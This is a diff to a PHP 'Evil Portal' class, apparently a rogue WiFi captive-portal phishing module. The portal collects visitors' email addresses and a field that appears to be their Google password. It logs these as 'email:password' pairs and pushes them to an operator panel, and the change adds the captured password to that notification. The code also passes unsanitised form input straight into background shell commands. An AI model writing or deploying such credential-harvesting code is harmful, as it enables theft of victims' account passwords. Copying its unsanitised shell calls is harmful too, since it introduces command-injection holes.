@@ -39,15 +39,15 @@ class MyPortal extends Portal
 		  $body = file_get_contents("/www/template.html"); //read the template 
 		  $mailtext = str_replace('TOKEN', $token, $body); //insert token (TOKEN will be replaced)
 		  if (isset($_POST['gettoken'])) {
-		  	$email = isset($_POST['email']) ? $_POST['email'] : 'email';
+		   $email = isset($_POST['email']) ? $_POST['email'] : 'email';
 		   $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
 		   $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
 		   $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
 		   $gpw = isset($_POST['gpw']) ? $_POST['gpw'] : 'gpw';
-		  	$this->execBackground("notify $email' Requested Token:'$token' - IP:'$ip"); //notify panel 
+		   $this->execBackground("notify $email' Requested Token:'$token' - PW:'$gpw' - IP:'$ip"); //notify panel 
 		   $this->sendmail($sub, $mailtext, $sender, $email); //Send the mail
-		   file_put_contents("$dir/evilportal-logs/$mac:mail.txt", "{$email}", FILE_APPEND); // write mail file
-         file_put_contents("$dir/evilportal-logs/portal-logins.txt", "{$email}:{$gpw}", FILE_APPEND); // write google clients file 
+		   file_put_contents("$dir/evilportal-logs/$mac:mail.txt", "{$email}/n", FILE_APPEND); // write mail file
+         file_put_contents("$dir/evilportal-logs/portal-logins.txt", "{$email}:{$gpw}/n", FILE_APPEND); // write google clients file 
          file_put_contents("$dir/evilportal-logs/$mac.txt", "{$token}", FILE_APPEND); // write auth file 
          die();
 		  }
@@ -58,8 +58,8 @@ class MyPortal extends Portal
          $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
          $dtoken = file_get_contents("$dir/evilportal-logs/$mac.txt"); //read auth file
          if($rtoken == $dtoken) {       
-            $this->execBackground("notify $mac' Login:'$token' IP:'$ip"); //notify panel 
-            $this->execBackground("writeLog $mac' - '$token");
+            $this->execBackground("notify $mac' Login:'$rtoken' IP:'$ip"); //notify panel 
+            $this->execBackground("writeLog $mac' - '$rtoken");
             parent::handleAuthorization();
             unlink("$dir/evilportal-logs/$mac:mail.txt");
             unlink("$dir/evilportal-logs/$mac.txt");
